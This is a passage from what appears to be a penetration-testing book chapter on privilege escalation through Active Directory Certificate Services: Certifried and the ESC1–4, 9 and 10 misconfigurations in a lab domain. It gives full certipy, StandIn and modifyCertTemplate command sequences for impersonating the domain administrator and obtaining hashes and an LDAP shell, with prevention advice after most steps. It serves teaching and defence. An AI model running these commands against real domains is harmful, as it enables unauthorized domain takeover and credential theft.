<p>In this section, we will explore practical<a id="_idIndexMarker759"/> techniques to escalate privileges by exploiting various security issues, such as template and extension misconfigurations (ESC1, 2, 3, 9, and 10), improper access controls (ESC4, 5, and 7), CA misconfiguration (ESC6), and relay attacks (ESC8 and 11). I have chosen such a grouping of the attacks from[12]. But to begin with, we will start with a critical vulnerability discovered by <em class="italic">Oliver Lyak</em>, called <strong class="bold">Certifried</strong>, which evolves into ESC9 and ESC10 after <span class="No-Break">the patch.</span></p>
<h2 id="_idParaDest-164"><a id="_idTextAnchor180"/>Certifried (CVE-2022-26923)</h2>
<p>This<a id="_idIndexMarker760"/> vulnerability has much in common <a id="_idIndexMarker761"/>with <strong class="source-inline">samAccountName</strong> spoofing (CVE-2021-42278). Original research by the author is <span class="No-Break">published here[13].</span></p>
<p>In AD CS, by default, there are two authentication certificates: user and machine. Every user account has a <strong class="bold">User Principal Name</strong> (<strong class="bold">UPN</strong>) that must be unique. The UPN is embedded into the certificate and used by <a id="_idIndexMarker762"/>KDC during authentication. Computer accounts do not have a UPN, as <strong class="source-inline">dNSHostName</strong> is used instead. The creator of the computer account has the right to write this property, called <strong class="source-inline">Validated write to DNS host name</strong>. There is no requirement for uniqueness of the attribute, but after <strong class="source-inline">dNSHostName</strong> has been changed, SPNs will be changed as well. SPNs have a uniqueness requirement in the domain, but the computer account creator can change SPNs (<strong class="source-inline">Validated write to service principal name</strong>). The idea of the attack is to create a computer account, clear SPNs with FQDN in them, change <strong class="source-inline">dNSHostName</strong> to match the target, (e.g., domain controller), and request the certificate. It is important to mention that the <strong class="source-inline">dNSHostName</strong> property is only used when the certificate is requested, not for <span class="No-Break">certificate mapping.</span></p>
<p>To perform attacks in this section, we will use a tool called Certipy[14]; however, there is a fork called <strong class="source-inline">certipy-ad</strong>, which can be installed on Kali. The syntax for both tools is identical. Both tools support all privilege escalation scenarios, Shadow Credentials attacks, and Golden <span class="No-Break">Certificate forgery.</span></p>
<p>Firstly, we make the necessary preparations for our attack. We will create a computer account, clear SPNs, and change the <strong class="source-inline">dNSHostName</strong> property to match the domain controller. The following PowerShell commands and <strong class="bold">StandIn</strong> tool will do <span class="No-Break">the job:</span></p>
<pre class="console">
StandIn.exe –computer legitpc –make
Set-ADComputer legitpc -ServicePrincipalName @{}
Set-ADComputer legitpc -DnsHostName meereen.essos.local
Get-ADComputer legitpc -properties dnshostname,serviceprincipalnames</pre> <p>The result of the<a id="_idIndexMarker763"/> preceding command execution is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer225">
<img alt="Figure 8.15 – Preparation for Certifried exploitation" height="762" src="image/B18964_08_15.jpg" width="1488"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.15 – Preparation for Certifried exploitation</p>
<p>Now, using <strong class="source-inline">certipy-ad</strong>, we <a id="_idIndexMarker764"/>request the certificate and authenticate as a domain controller <span class="No-Break">computer account:</span></p>
<pre class="console">
certipy-ad req -u 'legitpc$@essos.local' -p 'xfdb8UeqqgT9Aje' -target 192.168.56.23 -ca ESSOS-CA -template Machine -dc-ip 192.168.56.12
certipy-ad auth -pfx meereen.pfx -dc-ip 192.168.56.12</pre> <p>The result of the command execution is in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer226">
<img alt="Figure 8.16 – Obtaining the hash and TGT for the domain controller" height="607" src="image/B18964_08_16.jpg" width="1222"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.16 – Obtaining the hash and TGT for the domain controller</p>
<p>After <a id="_idIndexMarker765"/>certificate retrieval, it is recommended to change <strong class="source-inline">dNSHostName</strong> back to the original one[15]. Now, we have obtained the NT hash of the domain controller’s computer account, which can be used for authentication or Silver Ticket forgery. To prevent exploitation, install a patch provided <span class="No-Break">by Microsoft.</span></p>
<p>In the next section, you will learn how template and extension misconfigurations can lead to <span class="No-Break">privilege escalation.</span></p>
<h2 id="_idParaDest-165"><a id="_idTextAnchor181"/>Template and extension misconfigurations</h2>
<p>The following subsections <a id="_idIndexMarker766"/>detail some common ways to <a id="_idIndexMarker767"/>misconfigure certificate templates <span class="No-Break">and extensions.</span></p>
<h3>ESC1 – Misconfigured certificate templates</h3>
<p>A specific set <a id="_idIndexMarker768"/>of settings, including default ones, makes<a id="_idIndexMarker769"/> templates vulnerable. This privilege escalation scenario requires the following <span class="No-Break">configuration settings:</span></p>
<ul>
<li>Standard users have enrollment rights granted by the <span class="No-Break">Enterprise CA</span></li>
<li>Manager approval is disabled (<strong class="source-inline">mspki-enrollment-flag</strong> <span class="No-Break">is </span><span class="No-Break"><strong class="source-inline">0x00000000</strong></span><span class="No-Break">)</span></li>
<li>Authorized signatures are not required (<strong class="source-inline">msPKI-RA-Signature</strong> <span class="No-Break">is </span><span class="No-Break"><strong class="source-inline">0x00000000</strong></span><span class="No-Break">)</span></li>
<li>The certificate template defines any of the client <span class="No-Break">authentication EKUs</span></li>
<li>The certificate template allows requesters to specify <strong class="source-inline">subjectAltName</strong> in CSR (<strong class="source-inline">msPKI-Certificate-Name-Flag</strong> <span class="No-Break">is </span><span class="No-Break"><strong class="source-inline">0x00000001</strong></span><span class="No-Break">)</span></li>
</ul>
<p>The last point effectively allows the user to request a certificate as anyone, including the domain administrator. This behavior is defined by the <strong class="source-inline">CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</strong> flag in the <strong class="source-inline">mspki-certificate-name-flag</strong> property of the certificate template’s AD object. To find such a misconfigured template, an adversary can use Certify/Certipy or pure LDAP queries. The LDAP query looks complex, but it is just a concatenation of the preceding <span class="No-Break">configuration options:</span></p>
<pre class="console">
Get-ADObject -LDAPFilter '(&amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollmentenrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=essos,DC=local'</pre> <p>The <a id="_idIndexMarker770"/>result of the query is <span class="No-Break">as</span><span class="No-Break"><a id="_idIndexMarker771"/></span><span class="No-Break"> follows:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer227">
<img alt="Figure 8.17 – LDAP query to find ESC1 vulnerable template" height="258" src="image/B18964_08_17.jpg" width="1579"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.17 – LDAP query to find ESC1 vulnerable template</p>
<p>Now, we <a id="_idIndexMarker772"/>will verify the result<a id="_idIndexMarker773"/> of the LDAP query, issue a certificate for the built-in domain administrator, and authenticate <span class="No-Break">using it:</span></p>
<pre class="console">
certipy-ad find -u 'khal.drogo@essos.local' -p 'horse' -dc-ip 192.168.56.12 -vulnerable -stdout
certipy-ad req -u 'khal.drogo@essos.local' -p 'horse' -dc-ip 192.168.56.12 -target 192.168.56.23 -ca 'ESSOS-CA' -template ESC1 -upn 'administrator@essos.local'
certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.56.12</pre> <p>The result is in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer228">
<img alt="Figure 8.18 – Successful exploitation of ESC1" height="722" src="image/B18964_08_18.jpg" width="1220"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.18 – Successful exploitation of ESC1</p>
<p>To prevent privilege escalation, template hardening is required. The best approach is to disable the <strong class="source-inline">Supply in Request</strong> setting together with the enforcement of CA certificate manager approval. Next, user enroll rights can be tightened and EKU in certificates can be reviewed as well. Lastly, on a domain controller, strict user mapping can be enforced in the <strong class="source-inline">HKLM\SYSTEM\CurrentControlSet\Services\Kdc</strong> registry key with the DWORD <strong class="source-inline">UseSubjectAltName</strong> value set <span class="No-Break">to </span><span class="No-Break"><strong class="source-inline">0</strong></span><span class="No-Break">.</span></p>
<p>There is<a id="_idIndexMarker774"/> no straightforward <a id="_idIndexMarker775"/>way to reliably detect ESC1 using a Windows event log, so it is better to consider <span class="No-Break">prevention steps.</span></p>
<h3>ESC2 – Misconfigured certificate templates</h3>
<p>This technique is similar to ESC1 with a small deviation. The <strong class="source-inline">Any Purpose</strong> EKU allows an attacker to request an authentication certificate not on behalf of another user, but as the user itself. Conditions for vulnerability to exist are <span class="No-Break">as follows:</span></p>
<ul>
<li>Standard users have enrollment rights granted by the <span class="No-Break">Enterprise CA</span></li>
<li>Manager approval is disabled (<strong class="source-inline">mspki-enrollment-flag</strong> <span class="No-Break">is </span><span class="No-Break"><strong class="source-inline">0x00000000</strong></span><span class="No-Break">)</span></li>
<li>Authorized signatures are not required (<strong class="source-inline">msPKI-RA-Signature</strong> <span class="No-Break">is </span><span class="No-Break"><strong class="source-inline">0x00000000</strong></span><span class="No-Break">)</span></li>
<li>The certificate template defines the <strong class="source-inline">Any Purpose</strong> EKU or <span class="No-Break">no EKU</span></li>
</ul>
<p>The LDAP query to find a vulnerable template is <span class="No-Break">as follows:</span></p>
<pre class="console">
Get-ADObject -LDAPFilter '(&amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))' -SearchBase 'CN=Configuration,DC=essos,DC=local'</pre> <p>The result of the query is <span class="No-Break">as follows:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer229">
<img alt="Figure 8.19 – LDAP query to find the ESC2 vulnerable template" height="290" src="image/B18964_08_19.jpg" width="1579"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.19 – LDAP query to find the ESC2 vulnerable template</p>
<p>The following <a id="_idIndexMarker776"/>commands will allow <a id="_idIndexMarker777"/>you to request a certificate for <strong class="source-inline">khal.drogo</strong> and use it <span class="No-Break">for authentication:</span></p>
<pre class="console">
certipy-ad req -u 'khal.drogo@essos.local' -p 'horse' -dc-ip 192.168.56.12 -target 192.168.56.23 -ca 'ESSOS-CA' -template ESC2
certipy-ad auth -pfx khal.drogo.pfx -dc-ip 192.168.56.12</pre> <p>The result is in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer230">
<img alt="Figure 8.20 – Successful exploitation of ESC2" height="613" src="image/B18964_08_20.jpg" width="1222"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.20 – Successful exploitation of ESC2</p>
<p>The prevention recommendations for this are identical to the ones <span class="No-Break">for ESC1.</span></p>
<h3>ESC3 – Misconfigured enrollment agent templates</h3>
<p>This privilege<a id="_idIndexMarker778"/> escalation vector abuses a different <a id="_idIndexMarker779"/>EKU – <strong class="source-inline">Certificate Request Agent</strong> (OID <strong class="source-inline">1.3.6.1.4.1.311.20.2.1</strong>). This EKU allows you to enroll for a certificate on behalf of another user. The principal enrolls in such a template and uses the issued certificate to co-sign a CSR on behalf of another user. The next step is to enroll in a template that allows to send co-signed CSR on behalf of a user and then the CA will issue the certificate for this user. For this attack, two conditions should be met. The first condition requires an enrollment agent certificate template to allow users to enroll. The following configuration parameters must be present for the attack to <span class="No-Break">be successful:</span></p>
<ul>
<li>Standard users have enrollment rights granted by the <span class="No-Break">Enterprise CA</span></li>
<li>Manager approval is disabled (<strong class="source-inline">mspki-enrollment-flag</strong> <span class="No-Break">is </span><span class="No-Break"><strong class="source-inline">0x00000000</strong></span><span class="No-Break">)</span></li>
<li>Authorized signatures are not required (<strong class="source-inline">msPKI-RA-Signature</strong> <span class="No-Break">is </span><span class="No-Break"><strong class="source-inline">0x00000000</strong></span><span class="No-Break">)</span></li>
<li>The certificate template defines the <strong class="source-inline">Certificate Request </strong><span class="No-Break"><strong class="source-inline">Agent</strong></span><span class="No-Break"> EKU</span></li>
</ul>
<p>As we did <a id="_idIndexMarker780"/>before, we will utilize the LDAP query to find a <a id="_idIndexMarker781"/>template that matches the <span class="No-Break">first condition:</span></p>
<pre class="console">
Get-ADObject -LDAPFilter '(&amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.1)(!(pkiextendedkeyusage=*))))' -SearchBase 'CN=Configuration,DC=essos,DC=local'</pre> <p>As a result, we found the ESC3-CRA template to match the <span class="No-Break">first condition:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer231">
<img alt="Figure 8.21 – LDAP query to find the Certificate Request Agent template" height="371" src="image/B18964_08_21.jpg" width="1578"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.21 – LDAP query to find the Certificate Request Agent template</p>
<p>The second condition allows the user to use a certificate from the first condition to request a certificate on behalf of another user for authentication purposes. For this condition, the following configuration parameters must <span class="No-Break">be met:</span></p>
<ul>
<li>The Enterprise CA grants low-privileged users <span class="No-Break">enrollment rights</span></li>
<li>Manager approval <span class="No-Break">is disabled</span></li>
<li>The certificate template defines EKUs that <span class="No-Break">enable authentication</span></li>
<li>Enrollment agent restrictions are not implemented on <span class="No-Break">the CA</span></li>
<li>The template schema version 1 or is greater than 2 and specifies an <strong class="source-inline">Application Policy</strong> issuance requirement as the <strong class="source-inline">Certificate Request </strong><span class="No-Break"><strong class="source-inline">Agent</strong></span><span class="No-Break"> EKU</span></li>
</ul>
<p>It sounds a bit <a id="_idIndexMarker782"/>complicated, but the following LDAP query<a id="_idIndexMarker783"/> can <span class="No-Break">clarify requirements:</span></p>
<pre class="console">
Get-ADObject -LDAPFilter '(&amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=1)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(!(pkiextendedkeyusage=*))))' -SearchBase 'CN=Configuration,DC=essos,DC=local'</pre> <p>As a result, we found the ESC3 <span class="No-Break">vulnerable template:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer232">
<img alt="Figure 8.22 – LDAP query to find the ESC3 vulnerable template" height="261" src="image/B18964_08_22.jpg" width="1581"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.22 – LDAP query to find the ESC3 vulnerable template</p>
<p>The attack will consist of two steps – request a certificate for the agent and then use it to request a certificate on behalf of the domain administrator. The following commands will achieve the <span class="No-Break">desired result:</span></p>
<pre class="console">
certipy-ad req -u 'khal.drogo@essos.local' -p 'horse' -dc-ip 192.168.56.12 -target 192.168.56.23 -ca 'ESSOS-CA' -template ESC3-CRA
certipy-ad req -u 'khal.drogo@essos.local' -p 'horse' -dc-ip 192.168.56.12 -target 192.168.56.23 -ca 'ESSOS-CA' -template ESC3 -on-behalf-of 'essos\administrator' -pfx khal.drogo.pfx
certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.56.12</pre> <p>The result of the<a id="_idIndexMarker784"/> command execution is in the <span class="No-Break">following</span><span class="No-Break"><a id="_idIndexMarker785"/></span><span class="No-Break"> screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer233">
<img alt="Figure 8.23 – Successful exploitation of ESC3" height="895" src="image/B18964_08_23.jpg" width="1221"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.23 – Successful exploitation of ESC3</p>
<p>Prevention will be similar to the previous two attacks, but it is also important to constrain enrollment agents as well. We can define who can be an enrollment agent, and which users and certificate templates agents are allowed to enroll on <span class="No-Break">behalf of.</span></p>
<h3>ESC9 – No security extension</h3>
<p>This and the<a id="_idIndexMarker786"/> next attack vector were discovered by <em class="italic">Oliver Lyak</em> following Microsoft security updates in May 2022. Original research can be found here[16]. In order to fix Certifried (CVE-2022–26923), Microsoft introduces a new <strong class="source-inline">szOID_NTDS_CA_SECURITY_EXT</strong> security extension that embeds the requester’s <strong class="source-inline">objectSid</strong> property into the certificate. Also, two new registry key values were created – <strong class="source-inline">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel\CertificateMappingMethods</strong> and <strong class="source-inline">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc\StrongCertificateBindingEnforcement</strong>. These two values correspond to Kerberos and Schannel <span class="No-Break">certificate mappings.</span></p>
<p><strong class="source-inline">StrongCertificateBindingEnforcement</strong> may have three values, which correspond to <span class="No-Break">the following:</span></p>
<ul>
<li><strong class="source-inline">0</strong> – no strong certificate mapping check. KDC verifies that the certificate is issued by a trusted CA and can be used for authentication. Next, map it to an account via the UPN or DNS <span class="No-Break">SAN value.</span></li>
<li><strong class="source-inline">1</strong> (default) – checks contained identifiers in the <strong class="source-inline">altSecurityIdentities</strong> property of an account object. If not, then the domain controller will validate a new SID extension (<strong class="source-inline">szOID_NTDS_CA_SECURITY_EXT</strong>) in the certificate. If no extension is present, mapping is performed as if the value <span class="No-Break">is </span><span class="No-Break"><strong class="source-inline">0</strong></span><span class="No-Break">.</span></li>
<li><strong class="source-inline">2</strong> – all checks are the same as in the value of <strong class="source-inline">1</strong>, except for a missing extension, which will lead to <span class="No-Break">authentication denial.</span></li>
</ul>
<p>Schannel authentication does not directly use new security extensions. It will instead use S4U2self to map the certificate via Kerberos because it supports a new extension. However, the patch has broken certificate authentication in a lot of environments, and Microsoft suggested putting the value of the registry key to the old one. This means that certificates with a UPN or DNS name and <strong class="source-inline">CertificateMappingMethods</strong> value of <strong class="source-inline">0x4</strong> will not be influenced by new security extensions during mapping. Let’s summarize the conditions <span class="No-Break">for ESC9:</span></p>
<ul>
<li><strong class="source-inline">StrongCertificateBindingEnforcement</strong> is not set to <strong class="source-inline">2</strong> or <strong class="source-inline">CertificateMappingMethods</strong> contains the <span class="No-Break"><strong class="source-inline">0x4</strong></span><span class="No-Break"> value.</span></li>
<li>The template contains the <strong class="source-inline">msPKI-Enrollment-Flag</strong> value with the <strong class="source-inline">CT_FLAG_NO_SECURITY_EXTENSION</strong> flag <span class="No-Break">being set.</span></li>
<li>The template specifies the client <span class="No-Break">authentication EKU.</span></li>
<li>A compromised user has <strong class="source-inline">GenericWrite</strong> permission over a user who can enroll in a vulnerable template. Our final target is the user who will be compromised with the help of an <span class="No-Break">enrolled user.</span></li>
</ul>
<p>To emulate<a id="_idIndexMarker787"/> this attack, we need to install the May 2022 patch on the CA and domain controller[17]. I encourage you to make snapshots before installation. Then, we will create and publish the ESC9 template, set the flag from the second condition, grant enroll permissions to <strong class="source-inline">viserys.targaryen</strong>, and finally, execute an attack. From the Shadow Credentials attack, we already know that <strong class="source-inline">khal.drogo</strong> has the <strong class="source-inline">GenericAll</strong> right over <strong class="source-inline">viserys.targaryen</strong>. Let us emulate this scenario by following <span class="No-Break">these steps:</span></p>
<ol>
<li>To ensure that we correctly prepare our lab, run the <span class="No-Break">following commands:</span><pre class="source-code">
<strong class="bold">certutil -dstemplate ESC9 msPKI-Enrollment-Flag +0x00080000</strong>
<strong class="bold">certutil -dstemplate ESC9 msPKI-Enrollment-Flag</strong>
<strong class="bold">reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc /v StrongCertificateBindingEnforcement</strong></pre><p class="list-inset">The output should be as in the <span class="No-Break">following screenshot:</span></p></li> </ol>
<div>
<div class="IMG---Figure" id="_idContainer234">
<img alt="Figure 8.24 – Conditions to execute the ESC9 attack are met" height="393" src="image/B18964_08_24.jpg" width="848"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.24 – Conditions to execute the ESC9 attack are met</p>
<ol>
<li value="2">Retrieve the NT hash <span class="No-Break">of </span><span class="No-Break"><strong class="source-inline">viserys.targaryen</strong></span><span class="No-Break">:</span><pre class="source-code">
<strong class="bold">certipy shadow auto -u 'khal.drogo@essos.local' -p 'horse' -account viserys.targaryen</strong></pre></li> <li>Update the UPN of <strong class="source-inline">viserys.targaryen</strong> to <span class="No-Break">the administrator:</span><pre class="source-code">
<strong class="bold">certipy account update -username 'khal.drogo@essos.local' -p 'horse' -user viserys.targaryen -upn Administrator</strong></pre></li> <li>Request<a id="_idIndexMarker788"/> the certificate as <strong class="source-inline">viserys.targaryen</strong> using the ESC9 <span class="No-Break">vulnerable template:</span><pre class="source-code">
<strong class="bold">certipy req -username 'viserys.targaryen@essos.local' -hashes 'd96a55df6bef5e0b4d6d956088036097' -target 192.168.56.23 -ca 'ESSOS-CA' -template ESC9</strong></pre></li> <li>Change the <strong class="source-inline">viserys.targaryen</strong> UPN back to <span class="No-Break">the original:</span><pre class="source-code">
<strong class="bold">certipy account update -username 'khal.drogo@essos.local' -p 'horse' -user viserys.targaryen -upn viserys.targaryen@essos.local</strong></pre></li> <li>Obtain the NT hash of the administrator <span class="No-Break">via nPAC-the-hash:</span><pre class="source-code">
<strong class="bold">certipy auth -pfx 'administrator.pfx' -domain 'essos.local'</strong></pre></li> </ol>
<p>The result of the<a id="_idIndexMarker789"/> attack is in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer235">
<img alt="Figure 8.25 – Successful exploitation of ESC9" height="1654" src="image/B18964_08_25.jpg" width="1581"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.25 – Successful exploitation of ESC9</p>
<p>The best <a id="_idIndexMarker790"/>prevention recommendation is to set <strong class="source-inline">StrongCertificateBindingEnforcement</strong> to <strong class="source-inline">2</strong>; however, it can possibly break certificate authentication in the domain. Also, remove <strong class="source-inline">msPKI-Enrollment-Flag</strong> from the template with the <span class="No-Break">following command:</span></p>
<pre class="console">
certutil -dstemplate ESC9 msPKI-Enrollment-Flag -0x00080000</pre> <h3>ESC10 – Weak certificate mappings</h3>
<p>This attack <a id="_idIndexMarker791"/>technique has two scenarios – when <strong class="source-inline">StrongCertificateBindingEnforcement</strong> is set to <strong class="source-inline">0</strong> or <strong class="source-inline">CertificateMappingMethods</strong> contains <a id="_idIndexMarker792"/>the value <strong class="source-inline">0x4</strong>. In simple words, it means that the certificate’s SAN is preferred over the new security extension. The requirements regarding the template with the client authentication EKU and <strong class="source-inline">GenericWrite</strong> permissions on the user still must be met. The first scenario is identical to the ESC9 attack, but any certificate template can be used. The second scenario targets machine accounts and the default domain administrator, as they do not have the UPN property. Our goal will be to compromise the domain administrator. Again, we will use <strong class="source-inline">khal.drogo</strong> with the <strong class="source-inline">GenericAll</strong> permission <span class="No-Break">over </span><span class="No-Break"><strong class="source-inline">viserys.targaryen</strong></span><span class="No-Break">:</span></p>
<ol>
<li>To ensure that we correctly prepare our lab, run the <span class="No-Break">following command:</span><pre class="source-code">
<strong class="bold">reg query HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel /v CertificateMappingMethods</strong></pre><p class="list-inset">The output should be as in the <span class="No-Break">following screenshot:</span></p></li> </ol>
<div>
<div class="IMG---Figure" id="_idContainer236">
<img alt="Figure 8.26 – The CertificateMappingMethod value is 0x4, which allows an ESC10 attack" height="95" src="image/B18964_08_26.jpg" width="655"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.26 – The CertificateMappingMethod value is 0x4, which allows an ESC10 attack</p>
<ol>
<li value="2">Retrieve the NT hash <span class="No-Break">of </span><span class="No-Break"><strong class="source-inline">viserys.targaryen</strong></span><span class="No-Break">:</span><pre class="source-code">
<strong class="bold">certipy shadow auto -u 'khal.drogo@essos.local' -p 'horse' -account viserys.targaryen</strong></pre></li> <li>Update the UPN of <strong class="source-inline">viserys.targaryen</strong> <span class="No-Break">to </span><span class="No-Break"><strong class="source-inline">Administrator@essos.local</strong></span><span class="No-Break">:</span><pre class="source-code">
<strong class="bold">certipy account update -username 'khal.drogo@essos.local' -p 'horse' -user viserys.targaryen -upn 'Administrator@essos.local'</strong></pre></li> <li>Enroll in any certificate template that allows <span class="No-Break">client authentication:</span><pre class="source-code">
<strong class="bold">certipy req -username 'viserys.targaryen@essos.local' -hash 'd96a55df6bef5e0b4d6d956088036097' -target 192.168.56.23 -ca 'ESSOS-CA' -template User</strong></pre></li> <li>Change the <strong class="source-inline">viserys.targaryen</strong> UPN back to <span class="No-Break">the original:</span><pre class="source-code">
<strong class="bold">certipy account update -username 'khal.drogo@essos.local' -p 'horse' -user viserys.targaryen -upn viserys.targaryen@essos.local</strong></pre></li> <li>Obtain <a id="_idIndexMarker793"/>the LDAP shell <span class="No-Break">via</span><span class="No-Break"><a id="_idIndexMarker794"/></span><span class="No-Break"> Schannel:</span><pre class="source-code">
<strong class="bold">certipy auth -pfx 'administrator.pfx' -domain 'essos.local' -dc-ip 192.168.56.12 -ldap-shell</strong></pre></li> </ol>
<p>The result of the attack is in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer237">
<img alt="Figure 8.27 – Successful exploitation of ESC10" height="1029" src="image/B18964_08_27.jpg" width="1484"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.27 – Successful exploitation of ESC10</p>
<p>To <a id="_idIndexMarker795"/>prevent this attack, remove the <strong class="source-inline">0x4</strong> part<a id="_idIndexMarker796"/> from the <strong class="source-inline">CertificateMappingMethods</strong> setting in <span class="No-Break">the registry.</span></p>
<h2 id="_idParaDest-166"><a id="_idTextAnchor182"/>Improper access controls</h2>
<p>As everything in Active Directory<a id="_idIndexMarker797"/> is an object, it means that every object has its own ACL. In previous chapters, we discussed ACL abuse; now, we are going to reuse our knowledge, but from an AD <span class="No-Break">CS perspective.</span></p>
<h3>ESC4 – Vulnerable certificate template access control</h3>
<p>Certificate templates <a id="_idIndexMarker798"/>are objects in Active <a id="_idIndexMarker799"/>Directory. They have a security descriptor, which defines principals and their permissions over the templates. Weak access controls may allow an adversary to edit template settings, making the template vulnerable to the techniques previously covered. Critical rights from a security point of view are ownership, full control, and any type of <strong class="source-inline">Write</strong>* primitives. There are a variety of tools helping to identify and abuse vulnerable templates: <strong class="source-inline">PowerView</strong>, Bloodhound, StandIn, Certipy, and <strong class="source-inline">modifyCertTemplate</strong>[18]. A great step-by-step guide on how to exploit ESC4 solely with PowerView can be found here[19]. We will stick to the <strong class="source-inline">certipy-ad</strong> tool at the beginning. We detect vulnerable templates and users that can <span class="No-Break">abuse them:</span></p>
<pre class="console">
certipy-ad find -u 'khal.drogo@essos.local' -p 'horse' -dc-ip 192.168.56.12 -vulnerable -stdout</pre> <p>The output of the following command is <span class="No-Break">as follows:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer238">
<img alt="Figure 8.28 – khal.drogo has excessive permissions over ESC4" height="57" src="image/B18964_08_28.jpg" width="917"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.28 – khal.drogo has excessive permissions over ESC4</p>
<p>The next steps are to make the template vulnerable to an ESC1 attack by adding the <strong class="source-inline">ENROLLEE_SUPPLIES_SUBJECT</strong> property to the template. For a better understanding of the attack, let us do it step by step with the help of the <span class="No-Break"><strong class="source-inline">modifyCertTemplate</strong></span><span class="No-Break"> tool.</span></p>
<p>First of all, we will<a id="_idIndexMarker800"/> check <a id="_idIndexMarker801"/>the ACL and the attributes of <span class="No-Break">the certificate:</span></p>
<pre class="console">
python3 modifyCertTemplate.py essos.local/khal.drogo:horse -template esc4 -dc-ip 192.168.56.12 -raw
python3 modifyCertTemplate.py essos.local/khal.drogo:horse -template esc4 -dc-ip 192.168.56.12 -get-acl</pre> <p>As a result, we will see a list of attributes and confirm that <strong class="source-inline">khal.drogo</strong> has <strong class="source-inline">Write</strong> privileges over the template. Next, we will configure the template in a way that will fulfill the requirements for the <span class="No-Break">ESC1 attack:</span></p>
<ol>
<li>We will disable the “Manager Approval” requirement with the <span class="No-Break">following command:</span><pre class="source-code">
<strong class="bold">python3 modifyCertTemplate.py essos.local/khal.drogo:horse -template esc4 -dc-ip 192.168.56.12 -value 0 -property mspki-enrollment-flag</strong></pre></li> <li>Disable the “Authorized <span class="No-Break">Signature” requirement:</span><pre class="source-code">
<strong class="bold">python3 modifyCertTemplate.py essos.local/khal.drogo:horse -template esc4 -dc-ip 192.168.56.12 -value 0 -property mspki-ra-signature</strong></pre></li> <li>Enable SAN specification in <span class="No-Break">the request:</span><pre class="source-code">
<strong class="bold">python3 modifyCertTemplate.py essos.local/khal.drogo:horse -template esc4 -dc-ip 192.168.56.12 -add enrollee_supplies_subject -property msPKI-Certificate-Name-Flag</strong></pre></li> <li>Add an <a id="_idIndexMarker802"/>EKU that <a id="_idIndexMarker803"/>allows <span class="No-Break">domain authentication:</span><pre class="source-code">
<strong class="bold">python3 modifyCertTemplate.py essos.local/khal.drogo:horse -template esc4 -dc-ip 192.168.56.12 -property pkiExtendedKeyUsage -add "Client Authentication"</strong></pre></li> <li>Apply the “Application Policy” to allow <span class="No-Break">domain authentication:</span><pre class="source-code">
<strong class="bold">python3 modifyCertTemplate.py essos.local/khal.drogo:horse -template esc4 -dc-ip 192.168.56.12 -value "'1.3.6.1.5.5.7.3.2', '1.3.6.1.5.2.3.4'" -property mspki-certificate-application-policy</strong></pre></li> </ol>
<p>The result of the preceding commands is in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer239">
<img alt="Figure 8.29 – Vulnerable template adjusted to fit the ESC1 attack path" height="1255" src="image/B18964_08_29.jpg" width="1596"/>
</div>
</div>
